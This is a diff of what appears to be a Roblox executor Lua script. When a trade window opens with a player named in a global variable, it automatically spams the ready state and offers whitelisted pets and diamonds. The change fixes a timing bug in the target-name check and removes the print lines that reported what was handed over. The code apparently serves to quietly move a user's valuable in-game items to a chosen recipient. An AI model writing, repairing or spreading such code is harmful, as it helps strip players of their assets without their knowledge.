@@ -187,6 +187,13 @@ TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     local text = string.lower(title.Text or "")
     local targetName = string.lower(getgenv().UName)
 
+    -- FIX: The GUI becomes visible BEFORE the title text updates.
+    -- If the target name isn't in the text yet, wait for the game to update it (max 3 seconds).
+    if not string.find(text, targetName) then
+        title:GetPropertyChangedSignal("Text"):Wait(3)
+        text = string.lower(title.Text or "")
+    end
+
     -- Make sure we're trading the correct player
     if not string.find(text, targetName) then
         return
@@ -208,21 +215,10 @@ TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     -- IMPORTANT:
     -- Give the trade session time to initialize server-side
     task.wait(2)
-
-    -- Start ready spam
     task.spawn(rt)
-
-    -- Add pets first
     local addedPets = AddWhitelistedPets()
-
-    -- Small delay before diamonds
     task.wait(0.5)
-
-    -- Add diamonds
     ModifyDiamondOffer(Diamonds)
-
-    print("Added pets:", addedPets or 0)
-    print("Added diamonds:", Diamonds)
 end)
 
 local function rt()
